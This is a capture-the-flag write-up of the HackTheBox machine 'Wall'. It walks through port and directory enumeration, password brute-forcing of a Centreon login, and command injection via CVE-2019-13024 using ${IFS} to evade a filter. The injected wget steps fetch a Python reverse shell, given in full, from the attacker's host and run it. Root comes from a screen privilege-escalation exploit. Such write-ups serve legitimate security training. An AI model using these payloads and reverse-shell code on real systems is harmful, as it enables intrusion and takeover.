################################# HackTheBox - Wall ############################
############################### A write-up by Chazapp ##########################

# Introduction
This write-up will explain how I managed to get root on HackTheBox's Wall.
The box IP is 10.10.10.157 and runs Ubuntu.
This box was written by @askar and retires in a few weeks. Please do not leak
this document. This was my first rooted box.

# Attack Surface

We start by adding the box to our /etc/hosts file and run nmap against it.

```
$ echo "10.10.10.157	wall.htb" >> /etc/hosts
$ nmap -sV -sT -sC -o nmap.txt wall.htb

Nmap 7.70 scan initiated Wed Sep 25 14:47:56 2019 as: nmap -sV -sT -sC -o nmap.txt wall.htb
Nmap scan report for 10.10.10.157
Host is up (0.087s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA)
|   256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA)
|_  256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 25 14:48:07 2019 -- 1 IP address (1 host up) scanned in 10.76 seconds
```

We found an Apache web server running on port 80, serving the standard Default
page "It works". We will use gobuster and a common word list to enumerate the
available pages. Because we deal with Apache, we will add "-x .php" extensions. 

```
$ gobuster -w ../wordlists/common.txt -u http://wall.htb -t 100 -to 120s -x .php
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://wall.htb/
[+] Threads      : 100
[+] Wordlist     : ../wordlists/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php
[+] Timeout      : 2m0s
=====================================================
2019/10/04 15:11:49 Starting gobuster
=====================================================
/.hta (Status: 403)
/.hta.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/aa.php (Status: 200)
/index.html (Status: 200)
/monitoring (Status: 401)
/panel.php (Status: 200)
/server-status (Status: 403)
=====================================================
2019/10/04 15:12:11 Finished
=====================================================
```

"/aa.php" returns only a crytptic "1" symbol.
"/panel.php" returns "Just a test for php file !"
"/monitoring" returns Unauthorized, but changing the request from GET to POST
outputs this:

```
$ curl -X POST http://wall.htb/monitoring/
<h1>This page is not ready yet !</h1>
<h2>We should redirect you to the required page !</h2>

<meta http-equiv="refresh" content="0; URL='/centreon'" />
```

Going to "http://wall.htb/centreon" we find a login page to the monitoring
software Centreon, and displays the version v19.04. We found our foothold.

# Enumeration

Using `hydra` and the password list rockyou.txt, we will bruteforce access of the
Centreon dashboard.

```bash
$ $ hydra -l admin -P ../wordlists/rockyou.txt wall.htb http-post-form "/centreon/api/index.php?action=authenticate:username=^USER^&password=^PASS^&Login=Login:Bad credentials"

Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-10-04 16:02:46
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://wall.htb:80/centreon/api/index.php?action=authenticate:username=^USER^&password=^PASS^&Login=Login:Bad credentials
[80][http-post-form] host: wall.htb   login: admin   password: password1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-10-04 16:03:06

```

We found Login: admin, password: password1.
We may now access the Centreon Dashboard.

After a quick google search, we find that Centreon 19.04 is vulnerable to
CVE-2019-13024. In short, unproper sanitization of POST request parameter leads
to command injection in the context of the web-server user, www-data.

We even found a write-up and exploit script by the author of the box
https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/

By injecting commands in the "nagios_bin" POST parameter, we are able to run
commands on the box. But, some characters are forbidden by the box. We might not
use whitespaces or # character or the payload gets rejected and we are hit by a
403 Forbidden message.

Using ${IFS} Bash "Inter Field Separator", we are able to substitute whitespaces.
For our command injection to work, we would have needed a # character to comment
out the end of the command. Since this character is forbidden, we use `;echo` as
a command suffix in order for our commands to not crash, and keep context.

Our objective now is to upload a reverse shell python script to the server, then execute
it using the same command injection. Our reverse shell is a basic python script that
`dup2` stdin, stdout & stderr to a TCP socket pointing to our host:

```python
import socket,subprocess,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<IP-HTB-VPN>",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```

At first, i tried uploading the reverse.py file
to https://transfer.sh, then download it from the injected command, such as:

```cve2019-13024.py
...
 "nagios_bin": "wget${IFS}https://transfer.sh/XXXXX/reverse.py${IFS}-o${IFS}/tmp/reverse.py;echo${IFS}$?;ls${IFS}/tmp/;echo",
...
  
```
`echo $?` returns the error code of the last command ran, in this case wget.
The error code was 4, which after research, meant "Networking Error". I realized
the box forbid downloads from Internet, but might accept from the HTB network.
I started my own instance of transfer.sh using Docker, uploaded my reverse.py then
downloaded it to the box:

```bash
$ docker run -p 8080:8080 dutchcoders/transfer.sh:latest --provider local --basedir /tmp/ -d
$ curl --upload-file reverse.py localhost:8080/reverse.py
localhost:8080/XXXXX/reverse.py
```

I then updated the command above to download from my host to the box:

```cve2019-13024.py
  "nagios_bin": "wget${IFS}http://<IP-HTB-VPN>:8080/XXXXX/reverse.py -o /tmp/reverse.py;ls${IFS}/tmp;echo"
```

`ls /tmp` shows that our reverse.py file has been written, we setup a netcat
listener on our side, then execute the payload.

```
$ nc -lvp 4444
Listening on [any] 4444 ...
```

```cve2019-13024.py
  "nagios_bin": "python3${IFS}/tmp/reverse.py;echo",
```

```bash
$ nc -lvp 4444
Listening on [any] 4444 ...
www-data@Wall:/usr/local/centreon/www$
```

We got a shell as www-data inside the box. We're in.
Moving on to privilege escalation.

# Privilege Escalation

Poking around, we find in /tmp/ an exploit name "screenroot.sh" left here by
an other player, but we could not run it ourselves. A quick Google search shows
that the software `screen` v4.5.0 is vulnerable to privilege escalation via library
hijacking (LD_PRELOAD exploit). This script runs the vulnerability automatically:
https://github.com/XiphosResearch/exploits/blob/master/screen2root/screenroot.sh

We just had to upload this file using the same method as our reverse.py then run it,
dropping us inside a `screen` instance as root.

```
www-data@Wall:/tmp/: chmod +x screenroot.sh
www-data@Wall:/tmp/: ./screenroot.sh
root@Wall:/tmp/
```
We then exfiltrated the Root and user Flag, and completed this Box.



Hope you enjoyed the ride,
Chazapp
